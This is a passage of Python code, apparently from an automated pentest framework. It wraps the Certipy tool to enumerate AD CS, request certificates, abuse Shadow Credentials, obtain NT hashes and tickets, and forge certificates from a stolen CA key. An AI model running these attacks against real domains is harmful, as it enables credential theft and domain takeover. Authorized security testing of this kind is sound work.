            (r"\[-\]\s*User .+ doesn't have permission to delete", "Insufficient permissions to delete account"),
            (r"\[-\]\s*User .+ already exists", "Account already exists"),
            # SMB / logon errors
            (r"STATUS_LOGON_FAILURE", "SMB logon failure (invalid credentials)"),
        ]
        for pattern, message in error_patterns:
            if re.search(pattern, combined_output):
                return message
        return None

    def _classify_certipy_error(self, combined_output: str) -> tuple:
        """Classify certipy error output into (error_class, retryable, suggestions).

        Called by handlers to populate ToolResult error classification fields.
        Returns: (error_class, retryable, suggestions)
        """
        # Clock skew
        if re.search(r"KRB_AP_ERR_SKEW", combined_output):
            return ("config", True, [
                "Set clock_offset parameter to match target DC time",
                "Clock skew >5 minutes between container and DC",
            ])

        # NTLM auth failure
        if re.search(r"LDAP NTLM authentication failed|NTLM negotiate failed", combined_output):
            return ("auth", False, [
                "Verify username@domain format and password/hash",
                "Check if account is locked out or disabled",
            ])

        # Kerberos auth failure
        if re.search(r"Kerberos authentication failed", combined_output):
            return ("auth", False, [
                "Verify credentials and ensure Kerberos is available",
                "Try password-based auth instead of Kerberos",
            ])

        # KDC errors
        if re.search(r"KDC_ERR_S_PRINCIPAL_UNKNOWN", combined_output):
            return ("config", True, [
                "Set -target to the DC FQDN (e.g., DC01.corp.local) for SPN resolution",
                "Ensure DNS resolves the DC hostname",
            ])
        if re.search(r"KDC_ERR", combined_output):
            return ("config", True, [
                "Verify Kerberos configuration and target hostname",
                "Set -target to the DC FQDN for SPN resolution",
            ])

        # CA backup: Service Control Manager failure (must come before generic "Failed to connect")
        if re.search(r"Failed to connect to Service Control Manager", combined_output):
            return ("permission", False, [
                "CA backup requires local admin or ManageCA rights on the CA server",
                "Ensure credentials have sufficient privileges for DCOM/RPC access to the CA",
            ])

        # Connection/network errors
        if re.search(r"socket connection error|timed out|Could not connect|Failed to connect", combined_output):
            return ("network", True, [
                "Check network connectivity to target DC",
                "Verify DC IP is correct and LDAP port 389/636 is reachable",
                "Try increasing timeout",
            ])
        if re.search(r"Failed to get DCE RPC connection|endpoint mapper", combined_output):
            return ("network", True, [
                "RPC endpoint mapper failed -- target may be unreachable or RPC ports blocked",
                "Try -dcom or -web flag as alternative transport",
            ])

        # RPC_E_CALL_COMPLETE
        if re.search(r"RPC_E_CALL_COMPLETE", combined_output):
            return ("config", True, [
                "Use dcom=true parameter to switch to DCOM transport",
                "RPC_E_CALL_COMPLETE indicates the RPC call completed before the handler ran",
            ])

        # Certificate not valid
        if re.search(r"Certificate is not valid for client authentication", combined_output):
            return ("config", False, [
                "Certificate template lacks Client Authentication EKU",
                "Wait a few minutes if template was recently changed, then retry",
                "Request a certificate from a template with Client Authentication EKU",
            ])

        # Template denied
        if re.search(r"CERTSRV_E_TEMPLATE_DENIED", combined_output):
            return ("permission", False, [
                "User lacks enrollment permission on this template",
                "Check template ACL for Enroll/AutoEnroll permissions",
                "Try a different template or user with enrollment rights",
            ])

        # Unsupported cert type (template not published on CA)
        if re.search(r"CERTSRV_E_UNSUPPORTED_CERT_TYPE", combined_output):
            return ("params", False, [
                "Template is not supported/published on this CA",
                "Verify the template name (case-sensitive) with 'find' method output",
                "Template may exist in AD but not be published on this specific CA",
            ])

        # Enrollment agent restrictions
        if re.search(r"CERTSRV_E_RESTRICTEDOFFICER", combined_output):
            return ("permission", False, [
                "Enrollment agent restrictions block this request",
                "Try a different enrollment agent certificate or CA",
            ])

        # Insufficient access (shadow credentials)
        if re.search(r"insufficient access rights|INSUFF_ACCESS_RIGHTS", combined_output):
            return ("permission", False, [
                "No write access to target's msDS-KeyCredentialLink attribute",
                "Need GenericAll, GenericWrite, or WriteProperty on the target account",
                "Check bloodhound for accounts with write access to the target",
            ])

        # No identity in certificate
        if re.search(r"Username or domain is not specified.*identity information was not found", combined_output):
            return ("params", False, [
                "Certificate has no UPN -- specify -username and -domain explicitly",
                "This certificate may be for a machine account (DNS SAN only)",
            ])

        # CA management access denied
        if re.search(r"\[-\]\s*Access denied:", combined_output):
            return ("permission", False, [
                "Insufficient CA management permissions",
                "Need ManageCA right on the CA for template/officer operations",
            ])

        # RPC access denied
        if re.search(r"rpc_s_access_denied", combined_output):
            return ("permission", False, [
                "RPC access denied -- user lacks CA management permissions",
                "Need ManageCA or ManageCertificates right on the CA",
            ])

        # Generic CERTSRV errors
        if re.search(r"CERTSRV_E", combined_output):
            return ("permission", False, [
                "Certificate Services rejected the request",
                "Check the specific CERTSRV_E error code for details",
            ])

        # Failed to update key credentials (generic)
        if re.search(r"Could not update Key Credentials", combined_output):
            return ("permission", False, [
                "Failed to modify target's msDS-KeyCredentialLink",
                "Verify write permissions on the target account",
            ])

        # Account management errors
        if re.search(r"doesn't have permission to delete", combined_output):
            return ("permission", False, [
                "Insufficient permissions to delete the account",
                "Account creators typically cannot delete machine accounts -- need domain admin or Account Operators",
            ])
        if re.search(r"already exists", combined_output):
            return ("params", False, [
                "Account already exists -- use 'update' action instead, or choose a different name",
            ])

        # CA management: no action specified
        if re.search(r"No action specified", combined_output):
            return ("params", False, [
                "No CA action specified -- use add_officer, backup, enable_template, list_templates, issue_request, etc.",
            ])

        # SMB logon failure
        if re.search(r"STATUS_LOGON_FAILURE", combined_output):
            return ("auth", False, [
                "SMB authentication failed -- verify credentials",
                "Account may be locked out or password expired",
            ])

        return ("unknown", False, [])

    def _parse_find_json(self, json_files: List[str]) -> Dict[str, Any]:
        """Parse certipy find JSON output into structured data."""
        result = {
            "certificate_authorities": [],
            "certificate_templates": [],
            "vulnerable_templates": [],
            "vulnerable_count": 0,
        }

        for jf in json_files:
            if not jf.endswith(".json"):
                continue
            try:
                with open(jf, "r") as f:
                    data = json.load(f)
            except (json.JSONDecodeError, OSError):
                continue

            # Certipy v5 JSON structure: {"Certificate Authorities": {...}, "Certificate Templates": {...}}
            cas = data.get("Certificate Authorities", {})
            if not isinstance(cas, dict):
                cas = {}
            templates = data.get("Certificate Templates", {})
            if not isinstance(templates, dict):
                templates = {}

            for ca_id, ca_data in cas.items():
                ca_info = {
                    "name": ca_data.get("CA Name", ca_id),
                    "dns_name": ca_data.get("DNS Name", ""),
                    "certificate_subject": ca_data.get("Certificate Subject", ""),
                    "web_enrollment": ca_data.get("Web Enrollment", ""),
                    "user_specified_san": ca_data.get("User Specified SAN", ""),
                    "vulnerabilities": [],
                }
                # Check for CA-level vulnerabilities
                # Certipy v5 uses "[!] Vulnerabilities" key in JSON output
                vulns = ca_data.get("[!] Vulnerabilities", ca_data.get("Vulnerabilities", {}))
                if vulns:
                    for esc_id, vuln_info in vulns.items():
                        ca_info["vulnerabilities"].append(esc_id)
                result["certificate_authorities"].append(ca_info)

            for tmpl_id, tmpl_data in templates.items():
                tmpl_info = {
                    "name": tmpl_data.get("Template Name", tmpl_id),
                    "display_name": tmpl_data.get("Display Name", ""),
                    "enabled": tmpl_data.get("Enabled", False),
                    "client_authentication": tmpl_data.get("Client Authentication", False),
                    "enrollee_supplies_subject": tmpl_data.get("Enrollee Supplies Subject", False),
                    "requires_manager_approval": tmpl_data.get("Requires Manager Approval", False),
                    "authorized_signatures_required": tmpl_data.get("Authorized Signatures Required", 0),
                    "enrollment_permissions": tmpl_data.get("Permissions", {}).get("Enrollment Permissions", {}),
                    "vulnerabilities": [],
                }
                # Check for template-level vulnerabilities
                vulns = tmpl_data.get("Vulnerabilities", {})
                if vulns:
                    for esc_id, vuln_info in vulns.items():
                        tmpl_info["vulnerabilities"].append(esc_id)
                    result["vulnerable_templates"].append(tmpl_info)
                result["certificate_templates"].append(tmpl_info)

            result["vulnerable_count"] = len(result["vulnerable_templates"])

        return result

    def _parse_auth_output(self, output: str) -> Dict[str, Any]:
        """Parse certipy auth output for NT hash and TGT info."""
        result = {
            "nt_hash": None,
            "ccache_path": None,
            "kirbi_path": None,
            "username": None,
            "domain": None,
        }

        # Look for NT hash — certipy uses both "Got hash for" and "NT hash for"
        hash_match = re.search(r"(?:Got hash|NT hash) for '([^']+)':\s+(\S+)", output)
        if hash_match:
            identity = hash_match.group(1)
            result["nt_hash"] = hash_match.group(2)
            if "@" in identity:
                result["username"] = identity.split("@")[0]
            else:
                result["username"] = identity

        # Look for ccache/kirbi file paths
        # Certipy outputs: "Saved credential cache to 'user.ccache'" or "Wrote credential cache to 'user.ccache'"
        ccache_match = re.search(r"(?:Saved|Wrote) credential cache to '([^']+)'", output)
        if ccache_match:
            result["ccache_path"] = ccache_match.group(1)

        kirbi_match = re.search(r"Saved .* to '([^']+\.kirbi)'", output)
        if kirbi_match:
            result["kirbi_path"] = kirbi_match.group(1)

        # Domain from output — certipy prints "Using principal: 'user@domain'" (with quotes)
        # or "Using principal: user@domain" (without quotes)
        domain_match = re.search(r"Using principal:\s+'?(\S+?)@(\S+?)'?\s*$", output, re.MULTILINE)
        if domain_match:
            result["username"] = domain_match.group(1)
            result["domain"] = domain_match.group(2)

        return result

    def _parse_shadow_output(self, output: str) -> Dict[str, Any]:
        """Parse certipy shadow output."""
        result = {
            "nt_hash": None,
            "pfx_path": None,
            "device_id": None,
            "key_credentials": [],
        }

        # NT hash from auto mode — certipy uses both "Got hash for" and "NT hash for"
        hash_match = re.search(r"(?:Got hash|NT hash) for '([^']+)':\s+(\S+)", output)
        if hash_match:
            result["nt_hash"] = hash_match.group(2)

        # PFX file saved — certipy uses both phrasings
        pfx_match = re.search(r"(?:Saved|Wrote) certificate and private key to '([^']+)'", output)
        if pfx_match:
            result["pfx_path"] = pfx_match.group(1)

        # Device ID from add/auto — certipy v5 outputs multiple formats:
        #   "Key Credential generated with DeviceID 'e5e51e7305e043b0b94a1ee98db24854'"
        #   "Adding Key Credential with device ID 'e5e51e7305e043b0b94a1ee98db24854'"
        #   "DeviceID: a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6"
        device_match = re.search(
            r"(?:DeviceID|device ID|Device ID)[:\s]+'?([0-9a-f-]+)'?",
            output, re.IGNORECASE
        )
        if device_match:
            result["device_id"] = device_match.group(1).strip("'")

        # Key credential listing — certipy list output format:
        #   DeviceID: a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6
        #   Owner: svc_backup
        for match in re.finditer(
            r"DeviceID:\s+([^\n]+?)[\s\n]+.*?Owner:\s+([^\n]+)",
            output, re.DOTALL
        ):
            result["key_credentials"].append({
                "device_id": match.group(1).strip(),
                "owner": match.group(2).strip(),
            })

        return result

    # ── Method Handlers ────────────────────────────────────────

    async def find(
        self,
        username: str,
        dc_ip: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        vulnerable: bool = False,
        enabled: bool = False,
        dc_only: bool = False,
        stdout: bool = False,
        user_sid: Optional[str] = None,
        oids: bool = False,
        connection_timeout: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Enumerate AD CS — discover CAs, templates, and vulnerabilities."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "find"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        # Output options
        cmd.extend(["-json", "-text"])
        cmd.extend(["-output", prefix])

        if vulnerable:
            cmd.append("-vulnerable")
        if enabled:
            cmd.append("-enabled")
        if dc_only:
            cmd.append("-dc-only")
        if stdout:
            cmd.append("-stdout")
        if user_sid:
            cmd.extend(["-sid", user_sid])
        if oids:
            cmd.append("-oids")
        if connection_timeout is not None:
            cmd.extend(["-timeout", str(connection_timeout)])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""

        def _find_progress(line: str) -> Optional[str]:
            """Extract meaningful progress from certipy find output."""
            if "[*] Enumerating" in line:
                return line.strip().lstrip("[*] ")
            if "[*] Found" in line:
                return line.strip().lstrip("[*] ")
            return None

        try:
            result = await self.run_command_with_progress(
                cmd, env=auth_env,
                progress_filter=_find_progress,
            )
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            json_files = [f for f in new_files if f.endswith(".json")]
            text_files = [f for f in new_files if f.endswith(".txt")]

            # Parse JSON output
            parsed = self._parse_find_json(json_files)

            # Detect certipy errors (certipy often exits 0 even on auth failure)
            certipy_error = self._detect_certipy_error(combined)
            is_success = certipy_error is None or len(json_files) > 0

            # Classify error if detected
            error_class, retryable, suggestions = (None, False, [])
            if certipy_error and not is_success:
                error_class, retryable, suggestions = self._classify_certipy_error(combined)

            return ToolResult(
                success=is_success,
                data={
                    "method": "find",
                    "certificate_authorities": parsed["certificate_authorities"],
                    "certificate_templates": parsed["certificate_templates"],
                    "vulnerable_templates": parsed["vulnerable_templates"],
                    "vulnerable_count": parsed["vulnerable_count"],
                    "ca_count": len(parsed["certificate_authorities"]),
                    "template_count": len(parsed["certificate_templates"]),
                    "output_files": new_files,
                    "json_file": json_files[0] if json_files else None,
                    "text_file": text_files[0] if text_files else None,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def request(
        self,
        username: str,
        dc_ip: str,
        ca: str,
        template: str = "User",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        target: Optional[str] = None,
        on_behalf_of: Optional[str] = None,
        pfx_path: Optional[str] = None,
        retrieve: Optional[int] = None,
        key_size: int = 2048,
        web: bool = False,
        application_policies: Optional[str] = None,
        dcom: bool = False,
        subject: Optional[str] = None,
        pfx_password: Optional[str] = None,
        renew: bool = False,
        connection_timeout: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Request a certificate from a CA."""
        if not retrieve:
            if not password and not hashes and not kerberos and not aes_key:
                return ToolResult(
                    success=False,
                    error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
                )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "req"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-ca", ca])
        cmd.extend(["-template", template])

        # Output path with unique prefix to avoid overwrite prompt
        # Use just filename (no path) because certipy's try_to_save_file replaces / with _
        # Append .pfx so certipy writes the file with the correct extension
        out_name = f"{prefix}_{upn or username}".replace("@", "_").replace("\\", "_").replace("/", "_")
        cmd.extend(["-out", f"{out_name}.pfx"])

        if upn:
            cmd.extend(["-upn", upn])
        if dns:
            cmd.extend(["-dns", dns])
        if sid:
            cmd.extend(["-sid", sid])
        if on_behalf_of:
            cmd.extend(["-on-behalf-of", on_behalf_of])
        if pfx_path:
            cmd.extend(["-pfx", pfx_path])
        if retrieve is not None:
            cmd.extend(["-retrieve", str(retrieve)])
            # ESC7 retrieve: certipy looks for {request_id}.key in CWD to
            # combine with the retrieved cert into a PFX.  The key was saved
            # during the original denied request with a different filename
            # (using our -out prefix).  Find any .key file on disk and
            # symlink it as {request_id}.key so certipy can find it.
            expected_key = os.path.join(WORK_DIR, f"{retrieve}.key")
            if not os.path.exists(expected_key):
                # Search for key files in the working directory
                key_candidates = sorted(
                    [f for f in os.listdir(WORK_DIR) if f.endswith(".key")],
                    key=lambda f: os.path.getmtime(os.path.join(WORK_DIR, f)),
                    reverse=True,
                )
                if key_candidates:
                    src = os.path.join(WORK_DIR, key_candidates[0])
                    os.symlink(src, expected_key)
                    self.logger.info(f"Symlinked {src} -> {expected_key} for retrieve")
        if key_size != 2048:
            cmd.extend(["-key-size", str(key_size)])
        if web:
            cmd.append("-web")
        if application_policies:
            cmd.extend(["-application-policies", application_policies])
        if dcom:
            cmd.append("-dcom")
        if subject:
            cmd.extend(["-subject", subject])
        if pfx_password:
            cmd.extend(["-pfx-password", pfx_password])
        if renew:
            cmd.append("-renew")
        if connection_timeout is not None:
            cmd.extend(["-timeout", str(connection_timeout)])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        # Certipy prompts "Would you like to save the private key? (y/N):"
        # when a certificate request is denied (e.g., ESC7 SubCA flow).
        # Since run_command_with_progress uses stdin=DEVNULL, the prompt gets
        # EOF and the key is not saved.  Wrap with `yes` to auto-confirm.
        # This is safe — the prompt only appears on denial and saving the key
        # is always desired (needed for ESC7 -retrieve after -issue-request).
        wrapped_cmd = ["bash", "-c", "yes | " + " ".join(shlex.quote(c) for c in cmd)]

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command_with_progress(wrapped_cmd, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            pfx_files = [f for f in new_files if f.endswith(".pfx")]
            key_files = [f for f in new_files if f.endswith(".key")]

            # Check for request ID (pending approval scenario - ESC7)
            request_id = None
            id_match = re.search(r"Request ID(?:\s+is)?\s+(\d+)", combined)
            if id_match:
                request_id = int(id_match.group(1))

            certipy_error = self._detect_certipy_error(combined)

            # ESC7 flow: a DENIED request with a valid request_id is a
            # *partial success* — the request ID and saved private key are
            # needed for the next steps (ca -issue-request, then req -retrieve).
            # Treat CERTSRV_E_TEMPLATE_DENIED as success when we got a request_id.
            # Check the raw output (not the error message) because certipy prints
            # both "CERTSRV_E_TEMPLATE_DENIED" and "Failed to request certificate"
            # and _detect_certipy_error may match the latter first.
            is_denied_with_id = (
                request_id is not None
                and certipy_error is not None
                and "CERTSRV_E_TEMPLATE_DENIED" in combined
            )

            if is_denied_with_id:
                # Partial success: denied but we have the request ID (+ key if saved)
                is_success = True
                denial_note = (
                    f"Request denied (CERTSRV_E_TEMPLATE_DENIED) but request ID {request_id} captured. "
                    "ESC7 workflow: use ca method with issue_request={} to approve, "
                    "then request method with retrieve={} to get the certificate."
                ).format(request_id, request_id)
                if key_files:
                    denial_note += f" Private key saved to {key_files[0]}."
                certipy_error = None
                error_class, retryable, suggestions = (None, False, [])
            else:
                is_success = (len(pfx_files) > 0 or request_id is not None) and certipy_error is None
                error_class, retryable, suggestions = (None, False, [])
                denial_note = None
                if not is_success:
                    if certipy_error:
                        error_class, retryable, suggestions = self._classify_certipy_error(combined)
                    else:
                        certipy_error = "No PFX file generated and no request ID returned -- check CA name, template, and permissions"

            return ToolResult(
                success=is_success,
                data={
                    "method": "request",
                    "ca": ca,
                    "template": template,
                    "pfx_path": pfx_files[0] if pfx_files else None,
                    "key_path": key_files[0] if key_files else None,
                    "request_id": request_id,
                    "upn": upn,
                    "dns": dns,
                    "on_behalf_of": on_behalf_of,
                    "output_files": new_files,
                    "denial_note": denial_note,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def authenticate(
        self,
        pfx_path: str,
        dc_ip: str,
        pfx_password: Optional[str] = None,
        domain: Optional[str] = None,
        kirbi: bool = False,
        no_hash: bool = False,
        ldap_shell: bool = False,
        username: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = False,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Authenticate using a PFX certificate via PKINIT."""
        if not os.path.isfile(pfx_path):
            return ToolResult(
                success=False,
                error=f"PFX file not found: {pfx_path}",
            )

        self._ensure_work_dir()

        # Certipy auth writes <principal>.ccache/.kirbi with no output-prefix
        # option.  If a file with that name already exists (e.g. from a prior
        # run on the same /session mount), certipy prompts "Overwrite? (y/n)"
        # on stdin — but stdin is /dev/null so it gets EOF and aborts.
        # Work-around: temporarily rename existing ccache/kirbi files before
        # the run, then restore them after so we don't lose prior outputs.
        backed_up: List[tuple] = []
        for ext in ("*.ccache", "*.kirbi"):
            for existing in glob.glob(os.path.join(WORK_DIR, ext)):
                bak = existing + ".auth_bak"
                os.rename(existing, bak)
                backed_up.append((bak, existing))

        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "auth", "-pfx", pfx_path, "-dc-ip", dc_ip]

        if pfx_password:
            cmd.extend(["-password", pfx_password])
        if domain:
            cmd.extend(["-domain", domain])
        if kirbi:
            cmd.append("-kirbi")
        if no_hash:
            cmd.append("-no-hash")
        if ldap_shell:
            cmd.append("-ldap-shell")
        if username:
            cmd.extend(["-username", username])
        if ns:
            cmd.extend(["-ns", ns])
        if dns_tcp:
            cmd.append("-dns-tcp")
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        combined = ""
        try:
            result = await self.run_command_with_progress(cmd)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)

            # Rename new ccache/kirbi files with unique prefix to avoid
            # collisions on future runs and match the naming convention.
            prefix = self._unique_prefix()
            renamed_files = []
            for fpath in new_files:
                base = os.path.basename(fpath)
                if base.endswith((".ccache", ".kirbi")):
                    new_name = os.path.join(WORK_DIR, f"{prefix}_{base}")
                    os.rename(fpath, new_name)
                    renamed_files.append(new_name)
                else:
                    renamed_files.append(fpath)
            new_files = renamed_files

            parsed = self._parse_auth_output(combined)

            # Update file paths if new files were created
            ccache_files = [f for f in new_files if f.endswith(".ccache")]
            kirbi_files = [f for f in new_files if f.endswith(".kirbi")]
            if ccache_files:
                parsed["ccache_path"] = ccache_files[0]
                # Save ccache to /session/credentials/ for cross-tool usage
                identity = parsed.get("username") or os.path.splitext(os.path.basename(ccache_files[0]))[0]
                self._save_ticket(identity, ccache_files[0])
            if kirbi_files:
                parsed["kirbi_path"] = kirbi_files[0]

            certipy_error = self._detect_certipy_error(combined)
            has_result = parsed["nt_hash"] is not None or len(new_files) > 0
            is_success = has_result and certipy_error is None

            error_class, retryable, suggestions = (None, False, [])
            error_msg = None
            if not is_success:
                if certipy_error:
                    error_msg = certipy_error
                    error_class, retryable, suggestions = self._classify_certipy_error(combined)
                elif not has_result:
                    error_msg = "Authentication failed -- no NT hash or TGT obtained. Check PFX validity and DC connectivity."
                    error_class = "unknown"

            return ToolResult(
                success=is_success,
                data={
                    "method": "authenticate",
                    "nt_hash": parsed["nt_hash"],
                    "ccache_path": parsed["ccache_path"],
                    "kirbi_path": parsed["kirbi_path"],
                    "username": parsed["username"],
                    "domain": parsed["domain"],
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
        finally:
            # Restore backed-up ccache/kirbi files from prior runs
            for bak_path, orig_path in backed_up:
                if os.path.exists(bak_path):
                    # If a new file was written to the same orig_path, it's
                    # already been renamed with a prefix above, so safe to restore.
                    if not os.path.exists(orig_path):
                        os.rename(bak_path, orig_path)
                    else:
                        os.remove(bak_path)

    async def shadow(
        self,
        username: str,
        dc_ip: str,
        account: str,
        action: str = "auto",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        device_id: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Shadow Credentials attack — abuse msDS-KeyCredentialLink."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "shadow"]

        # Shadow action
        cmd.append(action)

        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-account", account])

        # Output prefix for auto/add actions — use unique prefix for ALL output files
        # (PFX, ccache, etc.) to prevent "File already exists. Overwrite?" prompts
        # that would kill the process via stdin EOF.
        if action in ("auto", "add"):
            cmd.extend(["-out", f"{prefix}_{account}"])

        if device_id:
            cmd.extend(["-device-id", device_id])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}

        # Clean up any existing ccache/pfx for this account to prevent
        # certipy's "File already exists. Overwrite? (y/n)" prompt which
        # causes EOF on stdin (DEVNULL) and kills the process before NT hash output.
        if action in ("auto", "add"):
            for ext in (".ccache", ".pfx"):
                stale = os.path.join(WORK_DIR, f"{account}{ext}")
                if os.path.exists(stale):
                    os.remove(stale)

        combined = ""
        try:
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            parsed = self._parse_shadow_output(combined)

            # Update PFX path from new files
            pfx_files = [f for f in new_files if f.endswith(".pfx")]
            if pfx_files:
                parsed["pfx_path"] = pfx_files[0]
                self._certificates[account] = pfx_files[0]

            # Save ccache if shadow auto produced one
            ccache_files = [f for f in new_files if f.endswith(".ccache")]
            if ccache_files:
                self._save_ticket(account, ccache_files[0])

            # Detect certipy errors
            certipy_error = self._detect_certipy_error(combined)
            is_success = certipy_error is None

            error_class, retryable, suggestions = (None, False, [])
            if not is_success:
                error_class, retryable, suggestions = self._classify_certipy_error(combined)

            return ToolResult(
                success=is_success,
                data={
                    "method": "shadow",
                    "action": action,
                    "account": account,
                    "nt_hash": parsed["nt_hash"],
                    "pfx_path": parsed["pfx_path"],
                    "device_id": parsed["device_id"],
                    "key_credentials": parsed["key_credentials"],
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def forge(
        self,
        ca_pfx: str,
        ca_password: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        subject: Optional[str] = None,
        crl: Optional[str] = None,
        serial: Optional[str] = None,
        key_size: int = 2048,
        validity_period: int = 365,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Forge certificates using compromised CA private key."""
        if not os.path.isfile(ca_pfx):
            return ToolResult(
                success=False,
                error=f"CA PFX file not found: {ca_pfx}",
            )

        if not upn and not dns and not subject:
            return ToolResult(
                success=False,
                error="Must specify at least one of: upn, dns, or subject for the forged certificate.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "forge", "-ca-pfx", ca_pfx]

        # Output path — just filename, certipy replaces / with _ in paths
        target_name = (upn or dns or "forged").replace("@", "_").replace(".", "_")
        out_name = f"{prefix}_{target_name}"
        cmd.extend(["-out", f"{out_name}.pfx"])

        if ca_password:
            cmd.extend(["-ca-password", ca_password])
        if upn:
            cmd.extend(["-upn", upn])
        if dns:
            cmd.extend(["-dns", dns])
        if sid:
            cmd.extend(["-sid", sid])
        if subject:
            cmd.extend(["-subject", subject])
        if crl:
            cmd.extend(["-crl", crl])
        if serial:
            cmd.extend(["-serial", serial])
        if key_size != 2048:
            cmd.extend(["-key-size", str(key_size)])
        if validity_period != 365:
            cmd.extend(["-validity-period", str(validity_period)])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        combined = ""
        try:
            result = await self.run_command_with_progress(cmd)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            pfx_files = [f for f in new_files if f.endswith(".pfx")]

            return ToolResult(
                success=len(pfx_files) > 0,
                data={
                    "method": "forge",
                    "pfx_path": pfx_files[0] if pfx_files else None,
                    "upn": upn,
                    "dns": dns,
                    "subject": subject,
                    "validity_days": validity_period,
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error="No forged PFX file generated — check CA PFX validity"
                if not pfx_files else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def template(
        self,
        username: str,
        dc_ip: str,
        template: str,
        action: str = "read",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        config_path: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """View or modify certificate template configuration."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        if action == "write_config" and not config_path:
            return ToolResult(
                success=False,
                error="config_path is required for 'write_config' action.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "template"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-template", template])

        if action == "read":
            # Certipy has no native "read" mode — running `template` with no
